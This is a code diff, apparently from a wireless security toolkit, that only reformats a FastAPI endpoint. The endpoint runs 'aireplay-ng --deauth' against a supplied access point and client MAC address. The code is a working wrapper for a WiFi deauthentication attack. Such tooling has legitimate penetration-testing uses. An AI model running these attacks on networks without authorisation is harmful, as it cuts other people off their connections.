@@ -5,11 +5,13 @@ from pydantic import BaseModel
 
 router = APIRouter()
 
+
 class AireplayParams(BaseModel):
     target_mac: str
     ap_mac: str
     iface: str
     count: int = 100
+
 
 @router.post("/api/attack/aireplay")
 def run_aireplay(params: AireplayParams):
@@ -20,10 +22,13 @@ def run_aireplay(params: AireplayParams):
     try:
         cmd = [
             "aireplay-ng",
-            "--deauth", str(params.count),
-            "-a", params.ap_mac,
-            "-c", params.target_mac,
-            params.iface
+            "--deauth",
+            str(params.count),
+            "-a",
+            params.ap_mac,
+            "-c",
+            params.target_mac,
+            params.iface,
         ]
         result = subprocess.run(cmd, capture_output=True, text=True)
         return {
@@ -31,7 +36,7 @@ def run_aireplay(params: AireplayParams):
             "command": " ".join(cmd),
             "stdout": result.stdout,
             "stderr": result.stderr,
-            "exit_code": result.returncode
+            "exit_code": result.returncode,
         }
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
